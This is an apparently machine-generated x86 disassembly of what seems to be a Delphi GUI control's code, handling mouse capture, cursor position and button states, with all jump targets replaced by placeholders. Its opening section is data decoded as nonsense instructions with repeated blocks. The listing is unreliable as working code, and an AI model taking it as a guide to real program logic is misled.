inc edi
add ah bl
pop ss
inc edi
add [ 0x73754354 ] dl
inc edx
add ah bh
xor al 0x40
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
ja r-xdata
add ah cl
push ss
add [ eax ] al
lodsb [ esi ]
mov al 0x43
inc edi
add [ edx - 0x5bffb8f8 ] cl
add al [ eax ]
add [ eax + esi * 4 + 0x16cc0043 ] ch
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
inc eax
inc edx
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] dh
or al 0x45
je r-xdata
add al 0x35
inc eax
outsb
mov eax eax
in al 0x6
inc edi
add [ edi ] al
adc eax 0x73754354
je r-xdata
add [ ecx + eax * 8 + 0x3bd00043 ] ch
inc ebp
insd
inc esp
jb r-xdata
add eax [ ebp ]
and al 0x8f
inc ecx
add [ edi + edi ] al
add al dl
cmp eax [ ebp ]
clc
jo r-xdata
inc edi
add [ edx + eax - 0x4f540000 ] ah
outsd
ja r-xdata
add al bh
inc edx
jne r-xdata
inc esp
add ah dh
retn
add al 0x3f
je r-xdata
pop [ ecx ]
outsb
les eax [ 0x2300047 ]
inc edi
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x43 ] si
je r-xdata
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + eax * 8 + 0x36e40043 ] al
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
insb
jae r-xdata
add [ ebp + 0x7600040 ] cl
inc edi
add [ eax ] al
sub_470772
inc ebx
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + eax * 8 + 0x36e40043 ] al
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4708d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xa
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edi ]
adc al 0xa
inc edi
add [ ecx + eax - 0x4f300000 ] ch
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] ah
sbb al 0x47
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0x4800471b ] cl
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
sub_470964
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esi + ebx + 0x47 ] al
add al dl
mov [ eax + eax + 0x64 ] 0x5c00471e
0x44
sub_470aba
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + ebx + 0x36e40047 ] dl
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_470c50
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_482618
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x1ad ] 0x1
mov [ esi + 0x1ae ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_470cec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4840dc
mov eax ebx
call sub_4840c8
test eax eax
je r-xdata
mov edx 0x6
mov eax ebx
call sub_44c02c
pop esi
pop ebx
retn
mov eax ebx
call sub_4840c8
mov al [ eax + 0x227 ]
sub al 0x2
jae r-xdata
mov edx 0x8
mov eax ebx
call sub_44c008
jmp r-xdata
pop esi
pop ebx
retn
sub_470d48
push esi
mov esi eax
mov eax esi
call sub_44e5f0
cmp [ esi + 0x1ad ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x1ab ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
jne r-xdata
mov [ esi + 0x1ab ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_470d8c
push esi
mov esi eax
mov eax esi
call sub_44e608
cmp [ esi + 0x1ad ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x1ab ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x1ab ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov [ esi + 0x1aa ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ esi + 0x1ae ] 0x0
sub_470de0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_482b7c
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov edx 0x13
call sub_46ebb4
push eax
mov eax [ ebx + 0x160 ]
mov esi [ eax + 0x14 ]
mov eax esi
call sub_424c68
pop edx
call sub_42bc8c
mov edx eax
mov eax esi
call sub_424c44
sub_470e4c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44e980
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034a4
sub_470e7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44de8c
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x1a9 ] 0x0
jne r-xdata
mov [ esi + 0x1aa ] 0x1
mov dl 0x2
mov eax esi
call sub_471208
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_470ed4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44e144
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
cmp [ ebx + 0x1a9 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_471248
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x1ae ]
je r-xdata
mov eax ebx
call sub_44c278
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov dl [ ebp - 0x2 ]
mov eax ebx
call sub_471208
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_44c2bc
cmp edi eax
jg r-xdata
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_470f70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44e1ec
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x1aa ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44c278
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax esi
call sub_47eb64
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_44c2bc
cmp edi eax
jle r-xdata
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
mov dl [ ebx + 0x1a9 ]
xor dl 0x1
mov eax ebx
call sub_471158
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x1ae ] 0x3
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov [ ebx + 0x1ae ] 0x0
mov [ ebx + 0x1ab ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax ebx
call sub_471248
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov al [ ebx + 0x1ae ]
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_4710b4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4833fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
add esp 0x10
pop ebx
retn
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424a9c
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ebx
pop edx
mov ebx [ eax ]
call [ ebx + 0xe4 ]
sub_47111c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4838dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov dl 0x1
sub_471158
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
test al al
jne r-xdata
cmp bl [ esi + 0x1a9 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x1a9 ] 0x0
je r-xdata
mov [ esi + 0x1a9 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov [ esi + 0x1ae ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x1ae ] 0x0
jne r-xdata
mov [ esi + 0x1ae ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4711dc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4839c8
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax esi
call sub_471208
mov [ esi + 0x1ab ] 0x0
pop esi
pop ebx
retn
sub_471224
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44be08
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
pop ebp
retn 0x8
sub_471248
push ebx
add esp 0xfffffff8
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop ecx
pop edx
pop ebx
retn
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44b0f8
cmp ebx eax
sete al
mov [ ebx + 0x1ab ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4712c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_482d1c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
inc [ esp + 0x8 ]
inc [ esp + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
sub_47132c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_470c50
mov [ ebx + 0x1cc ] 0x0
mov [ ebx + 0x1b0 ] 0x2
mov [ ebx + 0x1cd ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_433f90
mov esi eax
mov [ ebx + 0x1b8 ] esi
xor edx edx
mov eax esi
call sub_434118
push ebx
push sub_471594
mov eax esi
call sub_434138
mov edx 0x2ee
mov eax esi
call sub_434128
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4713bc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x1b8 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4826c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_47144c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x0
mov al [ esi + 0x1b4 ]
sub al 0x2
jb r-xdata
cmp bl 0x2
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
sub al 0x2
jae r-xdata
mov edi [ esi + 0x1b0 ]
sub eax edi
add edx eax
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov al [ esi + 0x1cd ]
sub al 0x1
jb r-xdata
mov edx [ esi + 0x4c ]
sar edx 0x1
jns r-xdata
sar edi 0x1
jns r-xdata
adc eax 0x0
mov eax [ esi + 0x1b0 ]
push eax
lea ecx [ esp + 0x4 ]
mov dl [ esi + 0x1b4 ]
mov eax [ esi + 0x160 ]
call sub_46ed34
jmp r-xdata
je r-xdata
mov edi [ esi + 0x1b0 ]
mov eax edi
sar eax 0x1
jns r-xdata
adc edx 0x0
sub eax edi
cmp bl 0x2
sete cl
and ecx 0x7f
add eax [ ecx * 4 + rw-data ]
mov ecx esp
call sub_41725c
adc edi 0x0
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1b0 ]
push eax
lea ecx [ esp + 0x4 ]
mov dl [ esi + 0x1b4 ]
mov eax [ esi + 0x160 ]
call sub_46eeec
jmp r-xdata
sub edx eax
cmp bl 0x2
sete al
and eax 0x7f
add edx [ eax * 4 + rw-data ]
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
sub eax edi
xor ecx ecx
mov cl [ esp + 0x8 ]
add eax [ ecx * 4 + rw-data ]
mov ecx esp
call sub_41725c
jmp r-xdata
adc eax 0x0
sub_471558
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_470e7c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
mov eax [ esi + 0x1b8 ]
call sub_434118
sub_471594
push ebx
push esi
mov ebx eax
mov dl [ ebx + 0x1cc ]
mov eax [ ebx + 0x1b8 ]
call sub_434118
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034a4
pop esi
pop ebx
retn
mov edx [ ebx + 0x1c8 ]
mov eax [ ebx + 0x1b8 ]
call sub_434128
sub_471628
push ebx
mov ebx eax
mov eax ebx
call sub_4710b4
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
pop ebx
retn
sub_47165c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47132c
lea edx [ esi + 0x80 ]
mov eax [ rw-data ]
call sub_405df8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4716a4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov al [ ebx + 0x1b4 ]
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
sub al 0x2
jae r-xdata
mov edx [ ebx + 0x1b0 ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ecx esp
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
sub eax edx
mov ecx esp
mov edx 0x3
call sub_41725c
adc edx 0x0
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
jmp r-xdata
sub eax [ ebx + 0x1b0 ]
mov edx 0x3
call sub_41725c
jmp r-xdata
adc eax 0x0
push 0x2
lea ecx [ esp + 0xc ]
mov edx [ ebx + 0x4c ]
sub edx 0x8
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax esi
call sub_472080
test eax eax
jle r-xdata
mov esi [ ebx + 0x30 ]
mov eax esi
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
sub eax [ ebx + 0x1b0 ]
call sub_41725c
lea ecx [ esp + 0xc ]
xor eax eax
mov al [ ebx + 0x5b ]
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x160 ]
call sub_46ed34
add esp 0x10
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ ebx + 0x1b0 ]
push eax
lea ecx [ esp + 0x4 ]
mov dl [ ebx + 0x1b4 ]
mov eax [ ebx + 0x160 ]
call sub_46eeec
sub_4717dc
push ebx
mov ebx eax
mov eax ebx
call sub_4719f8
test al al
je r-xdata
mov eax ebx
call sub_470cb8
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
pop ebx
retn
sub_471814
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
sub [ esp + 0x8 ] 0x9
test bl bl
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax esi
call sub_4719f8
test al al
je r-xdata
mov edx esp
mov eax esi
call sub_470e44
mov eax [ esp + 0x8 ]
mov [ esp ] eax
add [ esp + 0x8 ] 0x9
test bl bl
jne r-xdata
mov cl 0x1
mov cl 0x1
cmp [ esi + 0x1b0 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx esp
mov eax esi
call sub_470e44
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47187c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_471970
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x16c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x4c ]
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_41725c
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44c38c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x2ac ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1b0 ] 0x1
xor eax eax
push ebp
push sub_471953
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4711c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
sub edx [ eax + 0x40 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_47631c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47195a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1b0 ] 0x0
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4711c0
retn
sub_47197c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx [ r-xdata ]
call sub_403458
mov esi eax
mov eax ebx
call sub_4840c8
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
retn
sub_4719b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_470e7c
mov eax esi
call sub_4719f8
test al al
je r-xdata
test bl bl
jne r-xdata
mov [ esi + 0x1ae ] 0x0
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ esi + 0x1b0 ] 0x1
sub_4719f8
push ebx
add esp 0xffffffe0
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579c8
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_44c3b8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax ebx
call sub_44c2bc
push eax
lea eax [ esp + 0x1c ]
push eax
mov eax ebx
call sub_44c278
push eax
mov eax ebx
call sub_44c278
sub eax 0x9
xor edx edx
pop ecx
call sub_417298
lea eax [ esp + 0x18 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
add esp 0x20
pop ebx
retn
sub_471a60
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4710b4
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
xor edx edx
call sub_424990
push 0x2
mov eax ebx
call sub_44c2bc
sar eax 0x1
jns r-xdata
dec eax
push eax
mov eax ebx
call sub_44c278
sub eax 0x4
sub eax 0x3
lea ecx [ esp + 0x8 ]
pop edx
call sub_41725c
lea ecx [ esp + 0x4 ]
mov dl 0x3
mov eax [ ebx + 0x160 ]
call sub_46ed34
pop ecx
pop edx
pop ebx
retn
adc eax 0x0
sub_471ae8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x2a0 ]
mov ebx [ eax ]
call [ ebx + 0x94 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_471b10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_44d040
mov eax [ esi + 0x2a0 ]
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov [ edi ] al
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_471b88
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_482618
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c084
mov ebx eax
mov [ esi + 0x1a8 ] ebx
mov eax ebx
xor edx edx
call sub_4532ec
mov eax [ esi + 0x1a8 ]
mov edx 0x64
call sub_44c008
mov eax [ esi + 0x1a8 ]
mov [ eax + 0x124 ] esi
mov [ eax + 0x120 ] sub_471cdc
mov [ eax + 0x2a0 ] esi
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_471c20
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x1a8 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4826c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_471c50
push ebx
mov ebx eax
mov eax ebx
call sub_4841e0
mov eax [ ebx + 0x1a8 ]
call sub_4533bc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ ebx + 0x1a8 ]
mov edx [ eax + 0x48 ]
mov eax ebx
call sub_44c008
mov eax [ ebx + 0x1a8 ]
mov edx [ eax + 0x48 ]
add edx [ ebx + 0x48 ]
mov eax ebx
call sub_44c008
jmp r-xdata
sub_471cdc
push ebx
push esi
mov ebx eax
mov eax ebx
